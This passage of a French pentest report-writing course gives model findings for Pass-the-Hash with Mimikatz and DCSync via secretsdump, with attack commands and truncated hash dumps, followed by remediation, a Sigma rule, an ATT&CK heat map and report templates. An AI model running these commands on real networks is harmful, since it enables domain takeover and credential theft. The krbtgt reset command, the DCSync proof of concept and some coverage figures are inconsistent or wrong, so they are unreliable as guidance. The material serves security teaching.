│ CVSS VECTOR         │ CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H     │
│ CWE                 │ CWE-269 : Improper Privilege Management           │
│                     │ CWE-836 : Use of Password Hash Instead of Password │
│ MITRE ATT&CK        │ T1550.002 — Pass-the-Hash                         │
│                     │ T1003.001 — LSASS Memory                          │
│ DATE DÉCOUVERTE     │ 16/01/2026 — 13:30                                │
│ OUTIL               │ Impacket (secretsdump, psexec), Mimikatz          │
│ STATUT              │ Non corrigé                                       │
└─────────────────────────────────────────────────────────────────────────┘

### Description technique

Le compte de service `CORP\sql_svc` possède le privilège `AdminTo`
(local administrator) sur SRV01. Après avoir obtenu le hash NTLM du
compte sql_svc via Kerberoasting (VULN-04), le hash a été utilisé pour
s'authentifier sur SRV01 via SMB (Pass-the-Hash).

Sur SRV01, le compte `CORP\Administrator` (Domain Admin) avait une
session active, dont le hash NTLM a été extrait via Mimikatz
(sekurlsa::logonpasswords). Ce hash DA a ensuite été utilisé pour
s'authentifier sur le contrôleur de domaine DC01 via Pass-the-Hash.

**Chaîne de compromission :**
```
sql_svc (SPN cracké) → PtH → SRV01 → Mimikatz → Administrator hash
→ PtH → DC01 → Domain Admin
```

### Preuve d'exploitation (PoC)

**Étape 1 — Pass-the-Hash sql_svc → SRV01 :**
```bash
psexec.py -hashes :2b4f8c9e1a6d3f7c5b... CORP/sql_svc@SRV01.sogetel.local cmd.exe
```
→ Shell SYSTEM sur SRV01 obtenu (sql_svc = administrateur local)

**Étape 2 — Extraction hash Administrator via Mimikatz :**
```
mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 996
  User Name : Administrator
  Domain   : CORP
  NTLM     : c15334f5e3a1d12a6f...
```

**Étape 3 — Pass-the-Hash Administrator → DC01 :**
```bash
psexec.py -hashes :c15334f5e3a1d12a6f... CORP/Administrator@DC01.sogetel.local cmd.exe
```
→ Shell SYSTEM sur le contrôleur de domaine DC01
→ Contrôle total du domaine Active Directory

### Impact

**Confidentialité (C:H) :** Accès à toutes les ressources du domaine,
lecture de fichiers, emails, bases de données, GPO, scripts de logon.

**Intégrité (I:H) :** Modification possible des GPO, création de comptes,
ajout de machines au domaine, modification des ACLs.

**Disponibilité (A:H) :** Possibilité d'arrêter le DC, d'altérer la
réplication AD, de déployer un ransomware à l'échelle du domaine.

**Réglementaire :** Compromission totale du SI → NIS2 notification
obligatoire. Atteinte à la souveraineté numérique de l'entreprise.

### Remédiation

**Correctif immédiat :**
1. Changer le mot de passe du compte `sql_svc` (mot de passe fort 20+ chars)
2. Révoquer les droits d'administration locale de `sql_svc` sur SRV01 :
   ```powershell
   Remove-LocalGroupMember -Group "Administrators" -Member "CORP\sql_svc"
   ```
3. Forcer la déconnexion de toutes les sessions Administrator actives

**Correctif global :**
1. Appliquer le principe du moindre privilège (Tiered Model AD) :
   - Tier 0 : Domain Admins, DCs (isolation stricte)
   - Tier 1 : Serveurs, comptes de service
   - Tier 2 : Postes de travail, utilisateurs
2. Activer **Credential Guard** (Windows Defender Credential Guard) :
   ```powershell
   Enable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-CredentialGuard
   ```
3. Déployer **LAPS** (Local Administrator Password Solution) :
   ```powershell
   Install-WindowsFeature RSAT-LAPS
   Update-LapsADSchema
   Set-LapsADReadPasswordPermission -Identity "OU=Serveurs,DC=sogetel,DC=local"
   ```
4. Mettre en place **PAM/PAW** (Privileged Access Workstation)
5. Activer l'audit avancé des connexions SMB (EventID 4624/4625)
6. Déployer **Microsoft Defender for Identity** (MDI) pour détecter PtH

### Références

| Source | Référence |
|--------|-----------|
| MITRE | T1550.002 — Pass-the-Hash |
| MITRE | T1003.001 — LSASS Memory |
| ANSSI | Recommandations de sécurisation Active Directory |
| Microsoft | Credential Guard deployment guide |
| Microsoft | LAPS documentation |
```

#### 5.2.3 Fiche C — VULN-05 DCSync via ACL abusive

```markdown
## VULN-05 — DCSync via ACL abusive

┌─────────────────────────────────────────────────────────────────────────┐
│ IDENTIFIANT         │ VULN-05                                           │
│ TITRE               │ DCSync : extraction NTDS.dit via ACL              │
│                     │ DS-Replication-Get-Changes abusive                 │
│ CRITICITÉ           │ 🔴 CRITIQUE                                       │
│ CVSS SCORE          │ 8.8                                               │
│ CVSS VECTOR         │ CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H     │
│ CWE                 │ CWE-269 : Improper Privilege Management           │
│ MITRE ATT&CK        │ T1003.006 — DCSync                                │
│                     │ T1098 — Account Manipulation                      │
│ DATE DÉCOUVERTE     │ 16/01/2026 — 15:30                                │
│ OUTIL               │ Impacket — secretsdump.py                         │
│ STATUT              │ Non corrigé                                       │
└─────────────────────────────────────────────────────────────────────────┘

### Description technique

Le compte `CORP\sql_svc` possède le droit étendu
`DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`
sur le domaine. Ce droit, normalement réservé aux contrôleurs de
domaine, permet d'effectuer une réplication DCSync et d'extraire
l'intégralité des hashs de mots de passe du NTDS.dit.

L'ACL a été ajoutée manuellement par un administrateur à des fins de
sauvegarde en 2024 et jamais révoquée. Aucune documentation n'existe
sur cette modification.

**Vérification de l'ACL :**
```powershell
Get-ADUser sql_svc -Properties nTSecurityDescriptor |
  Select-Object -ExpandProperty nTSecurityDescriptor |
  ? {$_.ActiveDirectoryRights -match "Replicat"}
```

### Preuve d'exploitation (PoC)

**Commande utilisée :**
```bash
secretsdump.py -just-dc-ntlm sogetel/CORP\\Administrator@DC01.sogetel.local
```

**Résultat partiel — Hashs NT extraits :**
```
Administrator:500:aad3b435b51404ee...:c15334f5e3a1d12a6f...
krbtgt:502:aad3b435b51404ee...:7b4d9a5c2f3b8e1a6d...
sql_svc:1103:aad3b435b51404ee...:2b4f8c9e1a6d3f7c5b...
svc_web:1104:aad3b435b51404ee...:8c9e2b4f1a6d3f7c5b...
jsmith:1105:aad3b435b51404ee...:f1a6d3f7c5b8c9e2b4...
mdupont:1106:aad3b435b51404ee...:3f7c5b8c9e2b4f1a6d...
...312 comptes extraits au total
```

**Données extraites :**
- 312 hashs NTLM extraits (100% des comptes du domaine)
- Hash du krbtgt (permet la création de Golden Tickets — T1558.001)
- Tous les comptes de service, administrateurs et utilisateurs

### Impact

**Confidentialité (C:H) :**
- Tous les mots de passe du domaine sont compromis (format hash)
- Cracking possible pour les mots de passe faibles (hashcat)
- Le hash krbtgt permet des Golden Tickets persistants

**Intégrité (I:H) :**
- Golden Ticket : accès complet et persistant au domaine
- Même après changement de mot de passe du compte Administrator
- Forge de tickets Kerberos pour n'importe quel utilisateur

**Disponibilité (A:H) :**
- Attaque potentielle de type ransomware à l'échelle du domaine
- Destruction possible de l'Active Directory

### Remédiation

**Correctif immédiat :**
```powershell
# 1. Identifier l'ACL abusive
Get-ADObject -Filter * -Properties nTSecurityDescriptor |
  Where-Object {
    $_.nTSecurityDescriptor.Access |
    Where-Object {
      $_.ActiveDirectoryRights -match "ExtendedRight" -and
      $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    }
  }

# 2. Révoquer le droit de réplication
$acl = Get-Acl "AD:\DC=sogetel,DC=local"
$acl.RemoveAccessRule(
  New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    "CORP\sql_svc",
    "ExtendedRight",
    "Allow",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
  )
)
Set-Acl "AD:\DC=sogetel,DC=local" $acl
```

**Correctif global :**
1. **Audit complet des ACLs AD** (script d'audit des droits étendus) :
   ```powershell
   Get-ADObject -Filter * -SearchBase "DC=sogetel,DC=local" -Properties nTSecurityDescriptor |
     ForEach-Object {
       $_.nTSecurityDescriptor.Access |
       Where-Object { $_.ActiveDirectoryRights -ne "GenericRead" }
     }
   ```
2. **Implémenter le modèle de tiering AD** (Tier 0/1/2) avec isolation stricte
3. **Mettre en place l'audit avancé** Windows Event ID 4662
4. **Déployer une règle Sigma** pour détecter les DCSync :
   ```yaml
   title: DCSync Detection
   logsource:
     product: windows
     service: security
   detection:
     selection:
       EventID: 4662
       AccessMask: '0x100'
       Properties|contains:
         - '{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}'
         - '{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}'
     filter:
       SubjectUserName: 'DC01$'
     condition: selection and not filter
   level: critical
   ```
5. **Reset du krbtgt** (double reset à 24h d'intervalle) :
   ```powershell
   Reset-ADComputerServiceAccountPassword -Identity krbtgt
   # Attendre 24h puis répéter (pour invalider les Golden Tickets)
   ```
6. **Forcer le changement de TOUS les mots de passe** des comptes
   privilégiés (312 comptes)

### Références

| Source | Référence |
|--------|-----------|
| MITRE | T1003.006 — DCSync |
| MITRE | T1558.001 — Golden Ticket |
| MITRE | T1098 — Account Manipulation |
| ANSSI | Sécurisation Active Directory — Droits étendus |
| Microsoft | AD DS Security Best Practices |
```

### 5.3 Heat map modèle (Livrable 3)

```markdown
## Heat Map MITRE ATT&CK — SOGETEL Pentest Q1 2026

**Légende :** 🟥 Exploitée | 🟧 Tentative | 🟨 Non testée

### INITIAL ACCESS (TA0001)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1190 — Exploit Public-Facing App | 🟥 | SQLi sur login.php |
| T1078 — Valid Accounts | 🟧 | Testé (default creds portail) mais échec |
| T1566 — Phishing | 🟨 | Hors scope (RoE) |
| T1189 — Drive-by Compromise | 🟨 | Non testé |

### EXECUTION (TA0002)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1059.001 — PowerShell | 🟥 | Reverse shell + post-exploitation |
| T1059.003 — Windows Command Shell | 🟥 | Psexec cmd.exe |
| T1053.005 — Scheduled Task | 🟧 | Tentative persistance (nettoyée J5) |
| T1203 — Exploit Client App | 🟨 | Non testé |

### PERSISTENCE (TA0003)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1098 — Account Manipulation | 🟥 | ACL abusive (DCSync) exploitée |
| T1136 — Create Account | 🟥 | Compte svc_backup créé |
| T1053.005 — Scheduled Task | 🟧 | Callback planifié, supprimé J5 |
| T1505.003 — Web Shell | 🟨 | Non testé (WAF absent, aurait fonctionné) |

### PRIVILEGE ESCALATION (TA0004)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1548.002 — Bypass UAC | 🟥 | UAC bypass via fodhelper.exe sur SRV01 |
| T1068 — Exploitation for PrivEsc | 🟨 | Non testé |
| T1134.001 — Token Theft | 🟨 | Non testé |

### DEFENSE EVASION (TA0005)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1550.002 — Pass-the-Hash | 🟥 | PtH sql_svc → SRV01, Administrator → DC01 |
| T1562.001 — Disable/Modify Tools | 🟧 | Tentative désactivation AV (échec) |
| T1070.001 — Clear Windows Logs | 🟧 | Nettoyage partiel logs DC01 (J3) |
| T1027 — Obfuscated Files | 🟨 | Non testé |

### CREDENTIAL ACCESS (TA0006)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1003.001 — LSASS Memory | 🟥 | Mimikatz sekurlsa::logonpasswords |
| T1003.006 — DCSync | 🟥 | secretsdump via ACL abusive |
| T1558.003 — Kerberoasting | 🟥 | GetUserSPNs.py + hashcat |
| T1557.001 — LLMNR Poisoning | 🟧 | Responder actif mais pas exploité |
| T1110.001 — Password Guessing | 🟧 | Test RDP brute force (1 compte) |
| T1558.001 — Golden Ticket | 🟨 | Techniquement possible (krbtgt connu) |

### DISCOVERY (TA0007)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1087.002 — Domain Account | 🟥 | Enumération via BloodHound |
| T1069.002 — Domain Groups | 🟥 | Groupes AD énumérés |
| T1135 — Network Share Discovery | 🟥 | Partages SMB découverts |
| T1082 — System Information | 🟥 | Info système collectée |

### LATERAL MOVEMENT (TA0008)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1550.002 — Pass-the-Hash | 🟥 | SRV01, DC01, SRV02 |
| T1021.002 — SMB/Windows Admin Shares | 🟥 | PsExec C$ share |
| T1021.001 — Remote Desktop Protocol | 🟥 | RDP SRV02 avec hash Administrator |
| T1563.002 — RDP Hijacking | 🟨 | Non testé |

### COLLECTION (TA0009)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1005 — Data from Local System | 🟥 | Fichiers partage Finance |
| T1213 — Data from Info Repositories | 🟥 | SharePoint accessible |
| T1113 — Screen Capture | 🟥 | Screenshots bureau SRV01 |

### EXFILTRATION (TA0010)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| T1041 — Exfil Over C2 Channel | 🟥 | Exfiltration via reverse shell |
| T1567 — Exfil Over Web Service | 🟨 | Non testé |

---

## Statistiques de couverture

| Tactic MITRE | Techniques testées | Exploitées | Couverture |
|-------------|-------------------|------------|------------|
| TA0001 Initial Access | 2 | 1 (50%) | 50% |
| TA0002 Execution | 3 | 2 (67%) | 75% |
| TA0003 Persistence | 3 | 2 (67%) | 60% |
| TA0004 Privilege Escalation | 2 | 1 (50%) | 50% |
| TA0005 Defense Evasion | 3 | 1 (33%) | 75% |
| TA0006 Credential Access | 5 | 3 (60%) | 83% |
| TA0007 Discovery | 4 | 4 (100%) | 100% |
| TA0008 Lateral Movement | 3 | 3 (100%) | 75% |
| TA0009 Collection | 3 | 3 (100%) | 100% |
| TA0010 Exfiltration | 1 | 1 (100%) | 50% |
| **TOTAL** | **29** | **21 (72%)** | — |

---

## Gap Analysis — Risques résiduels

| Technique non testée | Raison | Risque résiduel |
|---------------------|--------|-----------------|
| T1566 — Phishing | Hors scope (RoE) | ÉLEVÉ (vecteur #1 de compromission) |
| T1486 — Ransomware simulé | Risque production | ÉLEVÉ (impact maximal) |
| T1558.001 — Golden Ticket | Non testé (krbtgt connu) | CRITIQUE (persistance totale) |
| T1505.003 — Web Shell | Non testé | MOYEN (WAF absent) |
| T1055 — Process Injection | Non testé | MOYEN (bypass AV possible) |
| T1530 — Cloud (Azure) | Hors scope | ÉLEVÉ (si Azure utilisé) |
```

### 5.4 Recommandations priorisées (Livrable 4)

```markdown
## Roadmap de remédiation — SOGETEL

### Phase 1 — Quick Wins (J+7)

| ID | Action | Vulnérabilités | Effort | Risque résiduel |
|----|--------|---------------|--------|-----------------|
| 1 | Corriger SQLi login.php (requêtes préparées) | VULN-01 | 2h | — |
| 2 | Retirer le portail de l'accès Internet (WAF temporaire) | VULN-01, VULN-02 | 1h | — |
| 3 | Révoquer les droits admin locaux de sql_svc sur SRV01 | VULN-03 | 15 min | — |
| 4 | Révoquer DS-Replication-Get-Changes pour sql_svc | VULN-05 | 15 min | — |
| 5 | Changer le mot de passe sql_svc (24+ caractères aléatoires) | VULN-03, VULN-04 | 30 min | — |

**Coût estimé :** 0 € (internes)  
**Risque résiduel après Phase 1 :** MOYEN (5/10)

### Phase 2 — Court Terme (J+30)

| ID | Action | Vulnérabilités | Effort | Risque résiduel |
|----|--------|---------------|--------|-----------------|
| 1 | Auditer TOUTES les ACLs AD (script PowerShell) | VULN-05 | 2 jours | — |
| 2 | Activer Credential Guard + LAPS | VULN-03 | 1 jour | — |
| 3 | Implémenter Tiered Model AD (Tier 0/1/2) | VULN-03, VULN-05 | 3 jours | — |
| 4 | Double reset krbtgt (J+1 et J+2) | VULN-05 | 1h | — |
| 5 | Forcer changement de passe des 312 comptes AD | VULN-03, VULN-05 | 1 jour | — |
| 6 | Désactiver LLMNR/NBT-NS/WPAD | VULN-04 | 30 min | — |

**Coût estimé :** 8 j.h. admin système (internes)  
**Risque résiduel après Phase 2 :** FAIBLE (2/10)

### Phase 3 — Moyen Terme (J+90)

| ID | Action | Vulnérabilités | Effort | Risque résiduel |
|----|--------|---------------|--------|-----------------|
| 1 | Déployer MFA (Azure AD MFA ou Duo) | VULN-01, VULN-02 | 5 jours | — |
| 2 | Déployer WAF (ModSecurity + OWASP CRS) | VULN-01, VULN-02 | 3 jours | — |
| 3 | Mettre en place SIEM + règles détection | Toutes | 10 jours | — |
| 4 | Former développeurs OWASP Top 10 | VULN-01, VULN-02 | 2 jours | — |
| 5 | Intégrer SAST (Semgrep) + DAST (ZAP) CI/CD | VULN-01, VULN-02 | 5 jours | — |
| 6 | Pentest de validation (retest) | Toutes | 3 jours | — |

**Coût estimé :** 35 k€ (licences MFA/WAF/SIEM + formation)  
**Risque résiduel après Phase 3 :** TRÈS FAIBLE (1/10)

### Phase 4 — Long Terme (J+180)

| ID | Action | Vulnérabilités | Effort | Risque résiduel |
|----|--------|---------------|--------|-----------------|
| 1 | Mettre en place Red Team interne (cycle trimestriel) | Toutes | Continu | — |
| 2 | Déployer EDR (CrowdStrike/SentinelOne) | Toutes | 10 jours | — |
| 3 | Viser certification ISO 27001 | Toutes | Projet 6 mois | — |
| 4 | Tabletop exercise crise cyber (COMEX) | Toutes | 2 jours/an | — |
| 5 | Programme Bug Bounty privé | VULN-01, VULN-02 | Continu | — |

**Coût estimé :** 60 k€/an (EDR + certification)  
**Risque résiduel après Phase 4 :** RÉSIDUEL ACCEPTABLE (0.5/10)
```

### 5.5 Discussion des bonnes pratiques observées

```
┌─────────────────────────────────────────────────────────────────────────┐
│              RETOUR D'EXPÉRIENCE — BONNES PRATIQUES                      │
│                                                                         │
│  ✅ CE QUI A BIEN FONCTIONNÉ :                                          │
│  ─────────────────────────────                                          │
│  • Quantification systématique (18 234 enregistrements, pas "beaucoup") │
│  • Code AVANT/APRÈS dans les remédiations                               │
│  • Taguage MITRE ATT&CK systématique (SOC peut créer des détections)    │
│  • Traduction métier dans l'exécutif (pas de jargon)                    │
│  • Roadmap priorisée avec coûts et efforts                              │
│  • IoC exportables fournis (format Sigma inclus)                        │
│                                                                         │
│  ⚠️ POINTS D'AMÉLIORATION :                                            │
│  ─────────────────────────                                              │
│  • Certains CVSS justifiés trop rapidement (détailler chaque métrique)  │
│  • Manque de captures d'écran annotées (décrites mais pas visuelles)    │
│  • Gap analysis parfois sous-estimée (risques résiduels à creuser)     │
│  • Golden Ticket non testé alors que krbtgt connu (à documenter)        │
│                                                                         │
│  🎯 POUR ALLER PLUS LOIN :                                              │
│  ──────────────────────────                                             │
│  • Générer le PDF final avec pandoc + template Eisvogel                 │
│  • Intégrer le rapport dans SysReptor pour le suivi des corrections     │
│  • Exporter les IoC en format STIX/TAXII pour le SIEM                  │
│  • Intégrer les findings dans DefectDojo pour le cycle DevSecOps       │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Annexes

### 6.1 Template de rapport exécutif

```markdown
# Rapport de Test d'Intrusion — Synthèse Exécutive

**Client :** [NOM]  
**Périmètre :** [SCOPE]  
**Type :** [BOÎTE NOIRE/GRISE/BLANCHE]  
**Dates :** [DATES]  
**Classification :** CONFIDENTIEL  

---

## Score de risque global

╔══════════════════════════════════╗
║  RISQUE GLOBAL : [CRITIQUE]     ║
║  Score : [X.X / 10]             ║
╚══════════════════════════════════╝

---

## Résumé

En [N] jours, l'équipe a :
- Identifié [X] vulnérabilités ([Y] critiques, [Z] hautes)
- [RÉSUMÉ COMPROMISSION PRINCIPALE]
- [DONNÉES/DROITS OBTENUS]
- [ABSENCE/PRÉSENCE DE DÉTECTION]

---

## Top 3 vulnérabilités critiques

| # | Vulnérabilité | Impact métier | CVSS |
|---|--------------|---------------|------|
| 1 | [TITRE] | [IMPACT] | [X.X] |
| 2 | [TITRE] | [IMPACT] | [X.X] |
| 3 | [TITRE] | [IMPACT] | [X.X] |

---

## Impact métier

**Réglementaire :**
- RGPD : [IMPACT]
- NIS2 : [IMPACT]
- PCI-DSS / ISO 27001 : [IMPACT]

**Financier :**

| Type d'impact | Estimation basse | Estimation haute |
|--------------|-----------------|------------------|
| Amendes | [MONTANT] | [MONTANT] |
| Remédiation | [MONTANT] | [MONTANT] |
| Perte exploitation | [MONTANT] | [MONTANT] |
| Réputation | [MONTANT] | [MONTANT] |
| **TOTAL** | **[MONTANT]** | **[MONTANT]** |

---

## Verdict

╔══════════════════════════════════════════════════╗
║  RECOMMANDATION : [GO / NO GO AVEC JUSTIFICATION]║
╚══════════════════════════════════════════════════╝

---

## Prochaines étapes

| Phase | Délai | Actions | Effort |
|-------|-------|---------|--------|
| Quick Wins | J+7 | [ACTIONS] | [EFFORT] |
| Court terme | J+30 | [ACTIONS] | [EFFORT] |
| Moyen terme | J+90 | [ACTIONS] | [EFFORT] |

Prochain pentest : [TYPE] à [DATE]
```

### 6.2 Template de fiche technique

```markdown
## VULN-XX — [TITRE]

┌─────────────────────────────────────────────────────────────────────────┐
│ IDENTIFIANT         │ VULN-XX                                           │
│ TITRE               │ [TITRE COMPLET]                                   │
│ CRITICITÉ           │ [🔴/🟠/🟡/🟢] [CRITIQUE/HAUTE/MOYENNE/BASSE]     │
│ CVSS SCORE          │ [X.X]                                             │
│ CVSS VECTOR         │ [CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]  │
│ CWE                 │ [CWE-XXX]                                         │
│ OWASP               │ [AXX:2021]                                        │
│ MITRE ATT&CK        │ [TXXXX]                                           │
│ DATE DÉCOUVERTE     │ [JJ/MM/AAAA]                                      │
│ OUTIL               │ [OUTILS UTILISÉS]                                 │
│ STATUT              │ [Non corrigé / Corrigé]                           │
└─────────────────────────────────────────────────────────────────────────┘

### Description technique

[5-15 LIGNES : Contexte, cause racine, fichier/ligne concerné, SGBD/OS,
versions, particularités]

### Preuve d'exploitation (PoC)

**Étape 1 — Détection :**
```
[PAYLOAD + RÉPONSE]
```

**Étape 2 — Exploitation :**
```
[COMMANDES + OUTPUTS — sqlmap, psexec, mimikatz, etc.]
```

**Étape 3 — Résultat final (si applicable) :**
```
[DONNÉES EXFILTRÉES / DROITS OBTENUS]
```

### Impact

**Confidentialité (C:X) :** [DÉTAIL]  
**Intégrité (I:X) :** [DÉTAIL]  
**Disponibilité (A:X) :** [DÉTAIL]  

**Réglementaire :** [RGPD/NIS2/PCI-DSS/HDS]

### Remédiation

**Correctif immédiat :**
```[LANGAGE]
// AVANT (vulnérable)
[CODE]

// APRÈS (corrigé)
[CODE]
```

**Correctif global :**
1. [MESURE 1]
2. [MESURE 2]
3. [MESURE 3]

### Références

| Source | Référence |
|--------|-----------|
| CWE | [CWE-XXX] |
| OWASP | [AXX:2021] |
| MITRE | [TXXXX] |
| CAPEC | [CAPEC-XX] |
```

### 6.3 Template heat map ATT&CK

```markdown
## Heat Map MITRE ATT&CK — [CLIENT] [PÉRIODE]

**Légende :** 🟥 Exploitée | 🟧 Tentative | 🟨 Non testée

### [TACTIC NAME] (TAXXXX)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| [TXXXX] — [Nom] | [🟥/🟧/🟨] | [Description] |

### [TACTIC NAME] (TAXXXX)

| Technique | Résultat | Contexte |
|-----------|----------|----------|
| [TXXXX] — [Nom] | [🟥/🟧/🟨] | [Description] |

[... répéter pour chaque tactique ...]

---

## Statistiques de couverture

| Tactic MITRE | Techniques testées | Exploitées | Couverture |
|-------------|-------------------|------------|------------|
| TAXXXX [Nom] | [N] | [N] ([X]%) | [X]% |
| **TOTAL** | **[N]** | **[N] ([X]%)** | — |

---

## Gap Analysis — Risques résiduels

| Technique non testée | Raison | Risque résiduel |
|---------------------|--------|-----------------|
| [TXXXX] | [RAISON] | [RISQUE] |
```

---

**Fin du Module 17 — Atelier rédactionnel sur cas d'étude**
